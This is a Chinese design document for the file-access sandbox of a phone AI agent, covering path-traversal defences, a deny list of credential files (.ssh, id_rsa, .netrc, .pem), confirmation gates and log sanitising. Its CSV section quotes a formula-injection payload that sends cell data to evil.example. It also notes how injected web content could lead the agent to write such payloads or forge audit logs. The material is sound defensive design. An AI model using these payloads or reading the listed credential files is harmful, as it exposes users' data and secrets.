文件能力沙箱设计 v1.0

发布主体：「代码乌托邦」（GitHub jyh17147540525-alt） 立场：该账号下发布的一切内容永久免费，不设任何捐款渠道。 我们只负责开发，其余环节由用户自行配置 —— 目标是把配置流程尽可能简化。 约束：我们没有服务器，也不打算有。所有数据与功能只能跑在用户自己的设备上。

本文描述 PocketAgent 的文件能力沙箱：让 agent 能读写用户指定范围内的文件、 在用户确认后删除文件、并借助手机完成办公任务。

对应实现模块：:filelogic（纯 Kotlin，零 Android 依赖）。

0. 为什么要单独做一层"沙箱"

在加这个能力之前，agent 对手机的操控只有一条线：读屏 → 点击。 它能替你点按钮，但碰不到任何文件。于是"帮我整理一下这周的会议记录" 这类请求只能靠一遍遍点开 App、截图、再点——低效，而且每一步都可能出错。

加上文件能力之后，agent 可以真的读、写、删。这也意味着它第一次获得了 不可逆的破坏力：屏幕点错可以撤销，文件删了不行。

所以这一层的设计目标不是"能读写"，而是：

在赋予破坏力的同时，让每一次破坏都是用户看过、点过、并且事后能查到的。

1. 架构：判定层与通道层分离

┌──────────────────────────────────────────────────────────────┐
│  :filelogic（纯 Kotlin，零 Android 依赖，可离线测试）          │
│                                                              │
│    FileScope            用户授权了哪些目录 + 位置黑名单         │
│    PathNormalizer       归一化 · 穿越防护 · 段级包含判定        │
│    FileAccessDecider    能不能动这一次操作（含确认门）          │
│    FileAuditLog         审计记录（防日志伪造）                  │
│    OfficeText           文本 / Markdown / CSV / JSON 组装       │
│    FileChannel          通道**接口**（实现在 Android 侧）       │
└──────────────────────────────────────────────────────────────┘
                            ▲
                            │ 只传字符串与纯数据
                            ▼
┌──────────────────────────────────────────────────────────────┐
│  Android 侧（下一轮）：SAF / 应用私有 / Shizuku 通道实现        │
└──────────────────────────────────────────────────────────────┘

为什么判定必须进纯模块。 这一层判错的后果全是静默的，而且方向是危险的那一侧：

漏了什么 后果 用户能看到什么
归一化漏掉一种 .. 变体 授权一个目录 = 授权整块存储 什么也看不到
包含判定写成字符串前缀 /Documents-evil 被当成在 /Documents 之下 什么也看不到
覆盖不要求确认 用户的原文件被静默替换 一句"已写入"
黑名单可被用户覆盖 一条被诱导的规则解除全部保护 什么也看不到

没有一条抛异常，没有一条在真机上"一眼看出来"。唯一可靠的抓手是确定性离线测试。

为什么 token 是不透明字符串。 SAF 的 tree URI（ content://com.android.externalstorage.documents/tree/primary%3ADocuments） 本模块不解析、不校验、也不认识。理由有两条：

  1. 解析它需要知道 provider 的私有格式，而 com.android.externalstorage 与第三方云盘 provider 的编码完全不同。 一旦开始解析，判定逻辑就与某个具体 provider 绑死，换一个就静默失效。
  2. 解析需要 android.net.Uri。引入它，本模块就再也进不了离线验证器。

分工是：本层算路径，Android 层认令牌。

2. 范围模型

2.1 用户怎么给范围

用 SAF（Storage Access Framework）：用户在系统文件选择器里亲手勾一个目录， 应用拿到持久化授权。

选它而不是"申请所有文件访问权限"，理由是三条：

  1. 零权限声明 —— 不需要 MANAGE_EXTERNAL_STORAGE，系统设置页不会出现红字警告
  2. 范围天然由用户圈定 —— 不是"能读全盘"，而是"用户给的那一个目录"
  3. 符合项目立场 —— 沙箱优先、用户签字放行

2.2 黑名单：即使范围内也永远不碰

DenyRules 定义五类规则，都只能加严，不能放宽：

规则类型 例子 为什么是这个粒度
deniedSegments .ssh、.gnupg、.android_secure 段名精确匹配，不是子串
deniedSuffixes .keystore、.pem、.key 以点开头，keyboard.txt 不命中
deniedNames id_rsa、.netrc、.git-credentials 固定文件名
deniedSegmentRuns Android/data、Android/obb 连续段序列，见下
（应用私有目录） data/data/com.pocketagent* 防止 agent 读到自己投递的凭据

为什么 Android/data 必须是"连续段序列"而不是两条段规则。 单看 data 太宽 —— 用户完全可能有 /Documents/data/报表.csv； 单看 Android 也一样。只有"这两个段挨在一起"才是那个意思。 拆成段规则会让用户 /Documents/data/ 里的所有文件变成不可读， 而用户完全不知道为什么。

为什么只能加严。 用户把授权范围划大（直接选整块内部存储）是完全正常的行为， 但那不该让 .ssh 里的私钥变得可读。 范围是用户给的，底线不是。

实现上，DenyRules.withUserRules 是唯一的修改入口，且只支持追加 —— 它没有、也不该有 removeSegment 之类的兄弟方法。 用 API 形状把原则钉死，比写一句注释然后指望别人遵守可靠得多。

3. 路径归一化与穿越防护

PathNormalizer 是本模块最关键的一段代码。它守的是： 从"用户授权了一个目录"到"实际只在这个目录里操作"之间的那道缝。

3.1 归一化规则

  1. 去首尾空白；空 → 拒
  2. 含 NUL（\u0000）→ 拒
  3. \ 统一成 /
  4. 必须以 / 开头（只接受绝对路径）→ 否则拒
  5. 逐段消解：丢弃空段与 .；.. 弹出上一段
  6. .. 弹出到根之上 → 拒
  7. 去掉尾部 /（根 / 除外）

第 6 步为什么是"拒"而不是"夹到根"。 /a/../../Documents 夹到根会得到 /Documents。 如果用户恰好授权了 /Documents，这次越界就静默变成了合法操作。 而越根本身是攻击信号（只有构造出来的路径才会越根）。 拒绝是唯一保守的选择。

⚠️ 注意与"正常的向上走"要分开：/Documents/Work/../Notes → /Documents/Notes 是合法的归一化，不该拒。只有弹出到根之上才拒。

3.2 四条"故意不做"

这四条每一条都是一个真实的安全边界，而且都容易被后人"顺手优化"掉：

① 不做 Unicode 归一化（NFKC）。 本项目在 SensitiveDetector 里对文本用了 NFKC（把全角「立即付款」与半角 视作同一个词），那是对的。但路径不是自然语言：文件系统只认 ASCII 的 U+002E 是"当前目录"。做了 NFKC 之后，一个叫 ．． 的目录名（U+FF0E ×2）会被折成 .. —— 归一化本身制造出一次路径穿越。

② 不做大小写折叠。 Android 的 /sdcard 底下是 ext4 / f2fs，大小写敏感；而某些云盘 provider 不敏感。 折叠会让 /Documents/Secret 与 /documents/secret 混为一谈 —— 那是放行方向。

③ 不做百分号解码。 SAF 的 tree URI 是 primary%3ADocuments 这种形式。解码是 Android 层的责任， 必须在调用本层之前完成。放在这里会引入"解一次"与"解两次"的差异 （%252E → %2E → .），而那是双重解码攻击的经典入口。

④ 不解析符号链接。 /sdcard 就是指向 /storage/emulated/0 的符号链接。解析它需要访问文件系统 —— 一旦引入就把本模块拖出离线验证器（本项目最贵的一课）。 约定：Android 层必须传 canonicalPath；取不到时应当拒绝这次操作， 而不是退回原路径 —— 退回意味着"解析失败"和"确实就是这条路径"长得一模一样。

3.3 ★★ 包含判定必须是段级

这是最容易写错、也最危险的一处：

// ✗ 危险：会通过所有"正常路径"的测试，只在攻击构造下暴露
"/storage/emulated/0/Documents-evil/x".startsWith("/storage/emulated/0/Documents")
// → true   但它显然不在 Documents 目录里

所以 isWithin 先切成段再逐段比。测试里专门有一条 同名前缀的兄弟目录不在其内 守着它 —— 变异验证确认：把它改回 startsWith，恰好 3 条测试变红。

4. 操作裁决与确认门

4.1 裁决顺序（短路返回，顺序不可调换）

0. 有没有授权范围          ← 没有 → 引导去配置，而不是报"操作失败"
1. 路径归一化              ← 失败 → 拒绝
2. 范围判定                ← 不在任何授权根下 → 拒绝
3. 位置黑名单              ← 在范围内但命中 → 拒绝
4. MOVE 的目标同样过 1~3   ← 目标越界 → 拒绝
5. 操作类型 → 放行/要确认   ← 确认标志**只在这一步被消费**

为什么黑名单排在范围之后（与 DefaultSafetyGuard 相反）。 DefaultSafetyGuard 把内置黑名单排第一，理由是"它是防用户/插件把限制调松的 单向阀"。那条理由在这里不成立 —— 本模块里范围与黑名单都是拒绝， 不存在"谁覆盖谁"。既然都只是拒绝，那就该按说明的准确度排序： 路径根本不在授权范围内时，说"你没授权这个位置"比说"这是密钥文件" 更接近用户需要知道的事。

4.2 ★★★ 确认不能绕过前置检查

最自然的写法是：

if (request.confirmedByUser) return Allowed(...)   // ✗ 危险

把"用户已确认"当作提前返回的理由。它读起来很合理 —— 用户都点过确认了， 还检查什么？但那样一来，确认就变成了万能钥匙。

真实的攻击路径：

1. agent 请求删除 /Documents/我的笔记.md
2. 确认框弹出，用户看了，点了确认
3. 执行之前，路径被改成 /Documents/.ssh/id_rsa
4. confirmedByUser = true → 直接放行

第 3 步不需要恶意 —— 它可以是模型的一次"修正"、一次重试， 或者插件在两次调用之间改了参数。 用户确认的是他看到的那个路径，不是函数收到的那个路径。

所以纪律是：归一化、范围、黑名单在每一次 decide 里都重新跑一遍， confirmedByUser 只是一个"如果结论是 RequireConfirmation，就把它降级为 Allowed"的开关。它不改变任何前置判定。

测试里有 5 条 确认之后……仍然被拒 守着它。变异验证确认： 把提前返回注入进去，恰好 5 条变红。

4.3 裁决矩阵

操作 目标状态 结论 理由
READ / LIST — 放行 读取可撤销，不改变任何东西
WRITE 不存在 放行 新建不打断用户
WRITE 已存在 确认 这是覆盖，用户的原内容没了
DELETE 文件 确认
DELETE 目录 确认（说清子项数）
MOVE — 确认 含重命名

为什么读取不确认。 确认得太频繁，用户会养成"看见就点确定"的习惯 —— 而那个习惯会让真正的危险确认也失效。把确认留给不可逆的操作。

为什么重命名走 MOVE。 它在文件系统层面与移动是同一个操作（rename(2)）。 单独拆出来会让人以为"重命名比较安全"—— 实际上对用户来说， 报告.md 变成 报告-旧.md 与文件消失一样让人困惑。

4.4 确认文案的三条要求

  1. 说清要动的是哪个文件（用文件名，不用完整路径 —— 路径在确认页的列表里另有一行）
  2. 说清会发生什么 —— "原有的内容会被整体替换"而不是"确认写入吗"
  3. 说清能不能撤销 —— 用户判断"要不要点"靠的就是这一句

⚠️ 并且：拿不到信息时不要编造。 existingSizeBytes 与 descendantCount 都是可空的，null 与 0 是两回事 —— 把"探测不到子项数"显示成 "要删除空文件夹"，用户点下确认才发现丢了 200 个文件。 那一次之后，他不会再信任任何确认框。

5. 审计日志：透明可见的落地形式

实时提示只在用户当时正看着屏幕时有效。而 agent 干活的特点是用户不看 —— 他让 agent 整理文档，然后去干别的了。等他回来，屏幕上只有一句"已完成"。

"我的文件怎么少了一个"这种问题，只能靠事后回看回答。

5.1 两条硬纪律

① 绝不记录文件内容。 这条由类型保证：FileAuditEvent 里没有任何能装内容的 字段，只有路径、操作、结论。所以"顺手把内容也记下来方便调试"在类型上就做不到。

② 路径必须消毒后再记。 POSIX 允许文件名含换行符。如果直接把路径拼进一行日志：

11:20:03 删除 /Documents/正常.txt
11:20:04 删除 /Documents/我
11:20:05 删除 /Documents/工资单.xlsx

第二行看起来是一条独立、真实的记录，但它只是第一行文件名的一部分。 用户回看时会以为"工资单被删了"，而那次操作根本没发生 —— 同时真实的记录被这条假象挤掉了。

这不是理论问题：agent 完全可以被诱导去创建一个带换行符的文件名。

所以 record 会先把控制字符转义成可见形式（\n 写成两个字符），并截断超长路径。 消毒收口在唯一的写入口 —— 因为构造点可能有很多个（裁决拒绝、通道失败、用户取消）， 而"每个构造点都要记得消毒"是不可依赖的。同 PrivacyFilter 收口所有上传路径。

5.2 六种结论

结论 含义
EXECUTED 判定放行，通道已执行
EXECUTED_AFTER_CONFIRM 用户确认后执行
DENIED 判定拒绝（越界 / 黑名单 / 路径非法）
FAILED 放行了但执行失败
CONFIRMATION_DECLINED 用户明确拒绝
CONFIRMATION_TIMEOUT 超时未回应 —— 视为拒绝

⚠️ 后两者必须分开：用户主动拒绝说明他不同意；超时说明他可能根本没看到。 合并成一条会让"我明明没点过同意，怎么删了"这种质疑无从查起。

6. 办公文档生成

本轮支持 纯文本 / Markdown / CSV / JSON，全部纯 Kotlin、零额外依赖。

这些"看起来就是拼字符串"的东西值得单独一个文件 + 一组测试， 因为它们拼出来的东西会在别的程序里被解析，而解析失败的表现是 "文件生成成功、也打开成功，但内容是错的"：

漏了什么 用户看到的现象
CSV 字段含逗号没加引号 Excel 里列全错位
CSV 的 " 没翻倍 该字段被截断，后半句跑进下一列
UTF-8 CSV 没写 BOM 中文全是乱码
单元格以 = 开头 Excel 把它当公式执行
JSON 里中文被转成 \uXXXX 体积 6 倍且人读不了

6.1 ★ CSV 公式注入

Excel / WPS / LibreOffice 都会把以 = + - @ 开头的单元格当作公式求值：

=HYPERLINK("http://evil.example/"&A1,"点我")

用户打开文件的那一刻，A1 的内容就被发出去了。老版本 Excel 的 DDE 甚至能执行本地命令。

为什么这件事在本项目里格外要紧：CSV 的内容常常来自模型输出， 而模型输出是可以被诱导的（用户读到的网页、别人发来的消息都可能成为它的输入） —— 也就是说，这条注入链的上游用户控制不了。

缓解手段是给可疑字段加一个前导单引号。但代价是内容被改了，所以做了两件事：

  1. 正负号不算可疑 —— 前提是整个字段是一个合法的数字。 -5、+5、-3.14 原样输出；而 -2+3+cmd|... 会被加引号。 这个例外是必要的：数据表里负数太常见，一律加引号会让导出的表格 到处是 '-5，用户会以为我们写坏了。
  2. 看第一个非空白字符，而不是 raw[0] —— 部分表格软件在判定公式前会忽略前导空白，所以 "\t=cmd" 与 "=cmd" 一样危险。

6.2 JSON 的两条"不做"

  • 不转义 /：有些序列化器写 \/（给 HTML 内嵌 JSON 用）。我们没有那个场景， 而多转一次会改变字节内容 —— 用户拿它做 diff 或哈希就会对不上。
  • 不把非 ASCII 转成 \uXXXX：规范上合法、解码结果也一样， 但一份中文 JSON 会膨胀到 6 倍，而且人眼完全读不了。

例外是 U+2028 / U+2029：它们在 JSON 里合法，但在 JavaScript 源码里是行终止符。 一份 JSON 被贴进 .js 是很常见的用法，转义掉成本为零。

7. 插件能力（v3.1 新增）

PluginCapability 新增三项：

id 说明 风险
file.read 读取你指定目录里的文件内容 HIGH
file.write 在你指定的目录里新建或修改文件（每次都会先问你） HIGH
file.delete 删除你指定目录里的文件（每次都会先问你） CRITICAL

⚠️ 与既有的 storage 是两件事，不要合并： storage 是插件自己的独立空间（用户看不到），file.* 是用户授权的真实目录。 合并会让"保存我的配置"和"读你的文档"看起来一样危险 —— 而前者是零风险的。 能力粒度太粗，用户就只能在"全给"和"全不给"之间选，那等于没有粒度。

★ 但逐项放行不等于放行这一次：即使插件拿到了 file.write， 每一次写入仍然要过 FileAccessDecider（范围 + 黑名单 + 覆盖确认）。 能力是"能不能申请"，裁决是"这一次能不能做" —— 两层都要有。

另外，这三项被加进了 L1_UNUSABLE_CAPABILITIES： L1 是声明式规则包，动作只有点击/输入/滚动那一组，没有任何一步能拿文件内容做判断。

8. 尚未做的

诚实列出来，避免"看起来已实现"：

  1. Android 侧的通道实现 —— FileChannel 目前只有接口。 SAF 授权界面（ACTION_OPEN_DOCUMENT_TREE）、DocumentFile 读写、 权限持久化都还没写。
  2. 真机验证 —— 全部结论都来自离线单测。SAF 在 HyperOS 上的实际行为 （尤其是 canonicalPath 能不能拿到、Android/data 的实际可达性）需要实测。
  3. .docx / .xlsx —— OOXML 本质是 zip + XML，用 JDK 的 java.util.zip 也能纯 Kotlin 生成，但要写一整套 XML 模板与关系文件，是独立一轮的工作量。 所以 DocumentFormat 里没有它们 —— 界面上不会出现"下拉框里有 xlsx 但写不出来" 这种自相矛盾的选项。
  4. 二进制文件读取 —— 目前只读文本，非 UTF-8 会如实拒绝而不是"尽力解码"。
  5. FileAccessDecider 的 TOCTOU 防护 —— 探测与执行之间的竞态由通道实现负责 （执行前重新 stat，状态不一致就放弃并重新裁决）。这条无法在纯逻辑层保证。
